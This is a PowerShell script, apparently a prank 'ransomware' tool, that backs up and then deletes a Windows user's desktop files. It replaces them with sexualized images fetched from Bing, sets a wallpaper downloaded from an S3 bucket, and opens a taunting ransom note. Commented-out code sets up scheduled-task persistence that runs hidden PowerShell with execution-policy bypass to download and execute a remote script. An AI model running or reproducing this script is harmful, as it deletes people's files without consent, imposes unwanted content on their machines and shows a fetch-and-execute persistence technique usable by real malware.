Install-PackageProvider -Name NuGet -Scope CurrentUser -Force
Install-Module BingCmdlets -Scope CurrentUser -Force
Import-Module BingCmdlets

# Check the backup folder and set current desktop
$backupFolder = 'C:\Goofin\cuts'
$desktop = [Environment]::GetFolderPath([Environment+SpecialFolder]::Desktop)
$targets = Get-childitem $desktop
If(!(Test-Path $backupFolder)) {
        New-Item -Path $backupFolder -ItemType directory
}
# if ( Test-Path "$env:LOCALAPPDATA\Microsoft\OneDrive\OneDrive.exe" ) 
# $backups = foreach ($t in $targets.FullName){Move-Item $t C:\Goofin\cuts -ErrorAction SilentlyContinue}
$backups = foreach ($t in $targets.FullName){Copy-Item $t $backupFolder -ErrorAction SilentlyContinue}


# enumerate targets for replacement & grab number of butts needed for grand plan
$buttCount = $targets.Count

$downloadFolder = 'C:\Goofin\butts'
If(!(Test-Path $downloadFolder)) {
        New-Item -Path $downloadFolder -ItemType directory
}

# Load our key for bing search and authenticate to the API
$APIKey = Get-Content '.\bing.api'
$bing =  Connect-Bing -APIKey "$APIKey"


# Search terms for the image search. This will become the seed phrase CSV once we get everything working 
$searchTerms = '"Big Butt" + "Yoga Pants"'

# Grab our results from bing and select the only the number matching the desktop items we backed up
$imageSearch = Select-Bing -Connection $bing -Table "ImageSearch" -Where "SearchTerms = `'$searchTerms`'"
$payload = ($imageSearch | select -first "$buttCount")


# Create the loop that strips the url property from the PSObject and creates a save path for each image we need
$urls = $payload | %{$_.ContentUrl}
foreach ($url in $urls){

    $path = join-path $downloadFolder $url
    $path = $path -replace '[^\p{L}\p{Nd}]', ''
    $butts = Invoke-WebRequest -uri "$url" -Outfile "$downloadFolder\$path.jpg"  
}

# Clear desktop and replace with images 
Get-ChildItem $desktop -ErrorAction SilentlyContinue | Remove-Item -ErrorAction SilentlyContinue
Get-ChildItem $downloadFolder | Copy-Item -Destination $desktop


# Hit 'em with it
# retrieve background image from S3
$buttGrab = Invoke-WebRequest -uri "https://buttboss.s3.us-east-1.amazonaws.com/butt-wall-paper.jpg" -OutFile $downloadFolder\background.jpg
$buttBackground = "$downloadFolder\background.jpg"

function Change-Background ([string]$buttBackground)
{
     set-itemproperty -path "HKCU:Control Panel\Desktop" -name WallPaper -value $buttBackground
     RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
}
Change-Background $buttBackground

# Write the ransom note, pop notepad, Invoke-Chills
function Invoke-Chills {
    echo "Now who's boss." | Out-File -FilePath "C:\Goofin\buttbossin.txt"
    notepad "C:\Goofin\buttbossin.txt"
}
Invoke-Chills


# Politeness Module
# Reset the photots and icons after within 24 hours.

# $unbutt = New-ScheduledTaskAction -Execute "powershell.exe Copy-Item -Path 'C:\Goofin\cuts' -Destination $desktop -Recurse -Force"
# $scheduleunbutt = New-ScheduledTasktrigger -Once -At 12pm
# Register-ScheduledTask GoodByeButts -Action $unbutt -Trigger $scheduleunbutt

# Persistence Module / Scheduled Task
# Commented out because it seemed irresponsible to have it be the default. This way people can play with it and not get butt'ed back in a week or two
#
# Get a random number between 1 week and 25 days to re-butt the system
# $reseed = 7..25 | Get-Random
# [int]$reseed
#  $rebutt = New-ScheduledTaskAction -Execute "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://github.com/mellonaut/buttboss/buttboss.ps1'''))'"
#  $schedulebutts = New-ScheduledTasktrigger -Daily -DaysInterval $reseed -At 10am
#  Register-ScheduledTask BringBackTheButts -Action $rebutt -Trigger $schedulebutts
# )
